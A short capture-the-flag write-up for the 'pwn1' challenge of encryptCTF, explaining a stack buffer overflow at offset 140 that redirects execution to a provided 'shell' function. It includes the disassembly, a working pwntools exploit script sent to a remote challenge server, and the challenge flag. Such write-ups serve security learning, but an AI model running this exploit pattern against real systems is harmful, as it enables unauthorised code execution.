# pwn1

This challenge was almost exactly the same as ```pwn0``` apart from a larger buffer and a different function to jump to.


We started by finding the vuln buffer size:
```
1094806849 found at offset: 140
```

With inspection of the code a fabricated method called ```shell``` has been provided. This will be the address we will overwrite the return pointer with.
```
Dump of assembler code for function shell:
   0x080484ad <+0>:	push   ebp
   0x080484ae <+1>:	mov    ebp,esp
   0x080484b0 <+3>:	sub    esp,0x18
   0x080484b3 <+6>:	mov    DWORD PTR [esp],0x80485c0
   0x080484ba <+13>:	call   0x8048370 <system@plt>
   0x080484bf <+18>:	leave  
   0x080484c0 <+19>:	ret    
End of assembler dump.
```

By once again putting these bits of information together we can generate an exploit.

```python
from pwn import *

r = remote('104.154.106.182', 2345)

# Payload creation
junk = b'A' * 140
shell_addr = p32(0x080484ad)

payload = junk + shell_addr

r.recvuntil("name: ")
r.sendline(payload)
r.interactive()
```

```
FLAG: encryptCTF{Buff3R_0v3rfl0W5_4r3_345Y}
```